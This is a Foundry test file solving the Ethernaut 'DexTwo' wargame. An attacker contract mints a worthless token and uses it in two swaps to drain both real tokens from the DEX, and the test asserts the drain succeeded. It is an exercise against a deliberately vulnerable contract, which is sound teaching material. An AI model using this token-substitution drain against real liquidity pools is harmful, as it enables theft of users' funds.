// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "src/openzeppelin-ethernaut/DexTwo.sol";

// amount & IERC20(from).balanceOf(address(DexTwo))) can be cancelled out by being the same
contract MiddleMan {
    function attack(address prey) public {
        DexTwo dex = DexTwo(prey);
        IERC20 token1 = IERC20(dex.token1());
        IERC20 token2 = IERC20(dex.token2());
        dex.approve(prey, type(uint256).max);

        SwappableTokenTwo token3 = new SwappableTokenTwo(
            address(this),
            "Token3",
            "T3",
            4
        );
        token3.transfer(address(prey), 1);
        token3.approve(prey, type(uint256).max);

        // 1 token3 * 100 token1 @ DexTwo / 1 token3 @ DexTwo = 100 token1
        dex.swap(address(token3), address(token1), 1);
        // 2 token3 * 100 token1 @ DexTwo / 2 token3 @ DexTwo (1 + 1 from the above tx) = 100 token2
        dex.swap(address(token3), address(token2), 2);
    }
}

// use another token to swap out token1 & token2
contract DexTwoTest is Test {
    DexTwo instance;
    uint256 totalSupply = 110;
    SwappableTokenTwo token1;
    SwappableTokenTwo token2;

    function setUp() public {
        instance = new DexTwo();
        token1 = new SwappableTokenTwo(
            address(instance),
            "Token1",
            "T1",
            totalSupply
        );
        token2 = new SwappableTokenTwo(
            address(instance),
            "Token2",
            "T2",
            totalSupply
        );
    }

    function test() public {
        instance.setTokens(address(token1), address(token2));
        token1.transfer(address(instance), 100);
        token2.transfer(address(instance), 100);

        MiddleMan middleMan = new MiddleMan();
        token1.transfer(address(middleMan), 10);
        token2.transfer(address(middleMan), 10);

        middleMan.attack(address(instance));

        assertEq(token1.balanceOf(address(instance)), 0);
        assertEq(token2.balanceOf(address(instance)), 0);
        assertEq(token1.balanceOf(address(middleMan)), totalSupply);
        assertEq(token2.balanceOf(address(middleMan)), totalSupply);
    }
}
